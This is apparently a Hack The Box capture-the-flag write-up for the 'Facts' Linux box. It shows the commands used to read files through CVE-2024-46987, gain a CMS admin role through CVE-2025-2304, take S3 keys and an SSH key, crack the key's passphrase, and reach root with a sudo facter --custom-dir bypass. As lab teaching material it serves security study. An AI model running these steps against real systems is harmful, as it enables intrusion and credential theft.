# HTB: Facts — Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-lightgrey) ![Category](https://img.shields.io/badge/Category-Web%20%7C%20PrivEsc-blue) ![Status](https://img.shields.io/badge/Status-Pwned-red)

**Platform:** Hack The Box  
**Date:** April 19, 2026  
**Author:** [Assem Merzoug](https://github.com/assemmerzoug)

---

## Summary

A web-focused Linux box running **Camaleon CMS v2.9.0** on nginx and a **MinIO S3** object storage instance. The attack chain required no kernel exploits — only enumeration, two public CVEs, and a sudo bypass.

**Flags:**
- `user.txt` → `1172c9c001c24fd2ba2c6971167cfacd`
- `root.txt` → `93beb25dfa795c8f108507a6951e8392`

---

## Kill Chain

```
Anonymous MinIO bucket (read/write)
    → Register CMS account → CVE-2024-46987 (LFI) → user.txt
    → CVE-2025-2304 (mass assignment → admin role)
    → Hardcoded S3 creds in admin panel
    → Internal MinIO bucket → steal trivia SSH key
    → Crack passphrase (dragonballz) → SSH as trivia
    → sudo facter --custom-dir bypass → root shell → root.txt
```

---

## Reconnaissance

```bash
nmap -sV -sC --top-ports 10000 -oN nmap_fast.txt 10.129.244.96
```

| Port  | Service | Version |
|-------|---------|---------|
| 22    | SSH     | OpenSSH 9.9p1 Ubuntu |
| 80    | HTTP    | nginx 1.26.3 — Camaleon CMS (Rails) |
| 54321 | HTTP    | MinIO S3-compatible object storage |

---

## Enumeration

### MinIO Anonymous Access

```bash
./mc alias set anon http://facts.htb:54321 "" ""
./mc ls anon/randomfacts   # public read + write — no auth required
./mc ls anon/facts         # 403 — private
```

The `randomfacts` bucket was fully accessible anonymously. The `facts` bucket was private.

### CMS Discovery

Navigating to `http://facts.htb/admin` revealed a Camaleon CMS login page with open self-registration. After registering, the footer confirmed **version 2.9.0** — vulnerable to two public CVEs.

---

## Initial Access

### CVE-2024-46987 — Authenticated Path Traversal (LFI)

Camaleon CMS 2.8.0–2.9.0 passes the `file` parameter in `download_private_file` directly to a file read without sanitisation.

```bash
python3 CVE-2024-46987/CVE-2024-46987.py \
  -u http://facts.htb -l 4ss3m -p biStE4MDptXM /etc/passwd

python3 CVE-2024-46987/CVE-2024-46987.py \
  -u http://facts.htb -l 4ss3m -p biStE4MDptXM /home/william/user.txt
```

Users confirmed via `/etc/passwd`: `trivia` (uid 1000), `william` (uid 1001).  
**user.txt:** `1172c9c001c24fd2ba2c6971167cfacd`

---

## Privilege Escalation — CMS → Admin

### CVE-2025-2304 — Mass Assignment

`UsersController#updated_ajax` calls `params.require(:user).permit!` — no allowlist. Any authenticated user can inject `user[role]=admin` during a password change.

```bash
cd CVE-2025-2304
python3 exploit.py -u http://facts.htb -U 4ss3m -P biStE4MDptXM -e
```

Output:
```
[+] Updated User Role: admin
[+] Extracting S3 Credentials
    s3 access key : AKIAF40501374BB88FF8
    s3 secret key : F+epVKRHNAjIdaWsUbuLwUHRMmtKWWZki9W4yTZP
    s3 endpoint   : http://localhost:54321
```

---

## Lateral Movement — S3 → SSH

### Internal Bucket Access

```bash
./mc alias set internal http://facts.htb:54321 \
  AKIAF40501374BB88FF8 F+epVKRHNAjIdaWsUbuLwUHRMmtKWWZki9W4yTZP

./mc ls internal/internal/.ssh/
./mc cp internal/internal/.ssh/id_ed25519 .
```

The `internal` bucket mirrored `trivia`'s home directory including an encrypted SSH private key.

### Passphrase Cracking

```bash
python3 ssh2john.py id_ed25519 > key.hash
john key.hash --wordlist=rockyou.txt
# → dragonballz
```

### SSH Access

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
# passphrase: dragonballz
```

---

## Privilege Escalation — trivia → root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

The sudoers config blocked `FACTERLIB` env variable but not the `--custom-dir` flag, which does the same thing.

```bash
echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
sudo /usr/bin/facter pwn --custom-dir /tmp
```

Root shell obtained.  
**root.txt:** `93beb25dfa795c8f108507a6951e8392`

---

## Vulnerabilities

| # | Vulnerability | Severity | CVE |
|---|--------------|----------|-----|
| 1 | Anonymous MinIO bucket — public read/write | CRITICAL | — |
| 2 | Authenticated path traversal in Camaleon CMS | CRITICAL | CVE-2024-46987 |
| 3 | Mass assignment privilege escalation in Camaleon CMS | CRITICAL | CVE-2025-2304 |
| 4 | Hardcoded S3 credentials in CMS admin panel | HIGH | — |
| 5 | SSH private key stored in S3 + weak passphrase | HIGH | — |
| 6 | sudo facter --custom-dir bypass | CRITICAL | — |

---

## Tools Used

- `nmap` — port scanning
- `mc` (MinIO client) — S3 bucket enumeration and access
- `CVE-2024-46987.py` — authenticated LFI exploit
- `CVE-2025-2304/exploit.py` — mass assignment privesc + S3 credential extraction
- `ssh2john` + `john` — SSH key passphrase cracking
- `facter` — sudo bypass for root

---

## Lessons Learned

- Always enumerate S3/MinIO endpoints — anonymous buckets are a critical misconfiguration
- Outdated CMS versions are high-value targets — check version numbers early
- Mass assignment (`permit!` in Rails) is a CVSS 9.4 vulnerability that's trivial to exploit
- Hardcoded credentials in web UIs are common in CTFs and real engagements
- When a sudo rule blocks an env variable, check for equivalent CLI flags
- `--custom-dir` is not `FACTERLIB`, but the effect is identical

---

---

*Part of my [CTF writeups](https://github.com/ASSEMMERZOUG/ctf-writeups) collection.*
